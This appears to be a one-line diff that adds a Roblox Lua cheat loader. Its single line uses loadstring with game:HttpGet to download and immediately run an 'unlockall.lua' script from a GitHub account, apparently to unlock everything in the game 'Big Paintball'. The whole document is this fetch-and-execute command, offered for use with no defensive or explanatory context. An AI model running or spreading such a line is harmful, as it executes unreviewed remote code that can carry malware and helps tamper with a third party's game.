@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Singularity5490/bigpaintball/main/unlockall.lua'))()
